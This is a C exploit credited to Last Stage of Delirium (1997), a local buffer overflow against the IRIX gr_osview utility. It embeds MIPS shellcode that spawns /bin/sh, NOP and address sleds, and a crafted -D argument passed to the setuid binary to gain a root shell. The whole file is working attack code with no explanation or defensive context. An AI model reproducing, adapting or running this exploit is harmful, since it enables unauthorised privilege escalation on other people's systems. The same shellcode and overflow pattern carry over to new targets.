/*## copyright LAST STAGE OF DELIRIUM jan 1997 poland        *://lsd-pl.net/ #*/
/*## /usr/sbin/gr_osview                                                     #*/

#define NOPNUM 3000
#define ADRNUM 3000
#define PCHNUM 1024
#define ALLIGN 1

char shellcode[]=
    "\x04\x10\xff\xff"    /* bltzal  $zero,<shellcode>    */
    "\x24\x02\x03\xf3"    /* li      $v0,1011             */
    "\x23\xff\x01\x14"    /* addi    $ra,$ra,276          */
    "\x23\xe4\xff\x08"    /* addi    $a0,$ra,-248         */
    "\x23\xe5\xff\x10"    /* addi    $a1,$ra,-240         */
    "\xaf\xe4\xff\x10"    /* sw      $a0,-240($ra)        */
    "\xaf\xe0\xff\x14"    /* sw      $zero,-236($ra)      */
    "\xa3\xe0\xff\x0f"    /* sb      $zero,-241($ra)      */
    "\x03\xff\xff\xcc"    /* syscall                      */
    "/bin/sh"
;

char jump[]=
    "\x03\xa0\x10\x25"    /* move    $v0,$sp              */
    "\x03\xe0\x00\x08"    /* jr      $ra                  */
;

char nop[]="\x24\x0f\x12\x34";

main(int argc,char **argv){
    char buffer[10000],adr[4],pch[4],*b;
    int i;

    printf("copyright LAST STAGE OF DELIRIUM jan 1997 poland  //lsd-pl.net/\n");
    printf("/usr/sbin/gr_osview for irix 6.2 6.3 IP:17,19,20,21,22,32\n\n");

    *((unsigned long*)adr)=(*(unsigned long(*)())jump)()+10256+1500+1024+3000;
    *((unsigned long*)pch)=(*(unsigned long(*)())jump)()+10256+1500+1024+32636;

    b=buffer;
    for(i=0;i<ALLIGN;i++) *b++=0xff;
    for(i=0;i<PCHNUM;i++) *b++=pch[i%4];
    for(i=0;i<ADRNUM;i++) *b++=adr[i%4];
    for(i=0;i<NOPNUM;i++) *b++=nop[i%4];
    for(i=0;i<strlen(shellcode);i++) *b++=shellcode[i];
    *b=0;

    execl("/usr/sbin/gr_osview","lsd","-D",buffer,0);
}